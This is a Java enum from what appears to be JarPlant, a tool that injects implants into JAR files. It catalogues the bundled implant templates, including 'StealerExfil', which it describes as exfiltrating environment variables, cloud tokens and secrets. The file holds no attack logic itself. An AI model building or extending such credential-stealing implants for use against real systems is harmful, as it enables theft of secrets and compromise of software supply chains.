package io.github.w1th4d.jarplant.implants;

/**
 * A kind of inventory for the bundled implants.
 * <p>There's no need to add custom implants to this list if you only intend to use it privately and load it
 * directly from a file.</p>
 * <p>However, if you want to publish it as a general purpose implant and bundle it with JarPlant, then please:</p>
 * <ul>
 *    <li>Fork the project over at GitHub.</li>
 *    <li>Add your implant class(es) to the Maven module `jarplant-implants` under the `io.github.w1th4d.jarplant.implants`
 *  package.</li>
 *    <li>dd a new value to the `ImplantInfo` enum as appropriate.</li>
 *    <li>Create a Pull Request on the official GitHub repo.</li>
 * </ul>
 * <p>Sharing is caring!</p>
 */
public enum ImplantInfo {
    ClassImplant(
            io.github.w1th4d.jarplant.implants.ClassImplant.class,
            "Template for a class implant."),
    SpringImplantController(
            io.github.w1th4d.jarplant.implants.SpringImplantController.class,
            "Template for a Spring REST controller."),
    SpringImplantConfiguration(
            io.github.w1th4d.jarplant.implants.SpringImplantConfiguration.class,
            "Template for adding your Spring implant component to a Spring configuration class."),
    StealerExfil(
            StealerExfil.class,
            "Exfiltrate host environment information and access tokens."
                    + " Exfiltrate interesting environment variables and properties that may contain various cloud tokens and secrets."
                    + " It encodes all exfil data using a custom compression/encoding scheme optimized for token data and splits it ut into sub-requests as necessary."
    );

    public final Class<?> clazz;
    public final String summary;

    ImplantInfo(Class<?> clazz, String summary) {
        this.clazz = clazz;
        this.summary = summary;
    }
}
